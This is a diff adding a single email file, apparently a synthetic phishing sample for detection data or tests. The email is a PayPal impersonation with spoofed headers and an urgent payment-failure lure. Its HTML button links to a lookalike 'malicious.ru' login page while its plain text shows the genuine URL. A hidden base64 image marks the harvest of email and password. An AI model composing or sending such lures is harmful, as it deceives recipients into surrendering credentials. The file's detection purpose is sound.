@@ -1,0 +1,34 @@
+Content-Type: multipart/alternative; boundary="===============3632663126231900231=="
+MIME-Version: 1.0
+Subject: =?utf-8?q?=5BURGENT=5D_Action_required_=E2=80=94_Paypal?=
+From: "Paypal Support" <noreply@paypal.com>
+To: student@university.edu
+Reply-To: support@aiaagfg.club
+Date: Wed, 29 Jul 2026 11:41:45 +0200
+Message-ID: <178531810549.4536.13618853423726067606@aiaagfg.club>
+X-Mailer: SendGrid-spoof/1.0
+Received-SPF: softfail
+X-Spam-Status: unknown
+
+--===============3632663126231900231==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+Dear Customer,
+
+URGENT: Your payment failed.
+
+Please verify my account now at the following link:
+https://www.paypal.com/secure/verify
+
+Regards,
+Paypal Support Team
+--===============3632663126231900231==
+Content-Type: text/html; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+<html><body><p>Dear Customer,</p><p>URGENT: Your payment failed.</p><p><a href="https://paypal.secure0.secure1.secure2.malicious.ru/login">Verify My Account Now</a></p><p>Or copy this link: <a href="https://www.paypal.com/secure/verify">https://www.paypal.com/secure/verify</a></p>
+<div style="display:none"><img src="data:text/plain;base64,dHJhY2tpbmdfaWQ9Mjk1Mjc0NzUwMSZicmFuZD1wYXlwYWwmaGFydmVzdD1lbWFpbCxwYXNzd29yZA==" /></div><p>Regards,<br>Paypal Support Team</p></body></html>
+--===============3632663126231900231==--
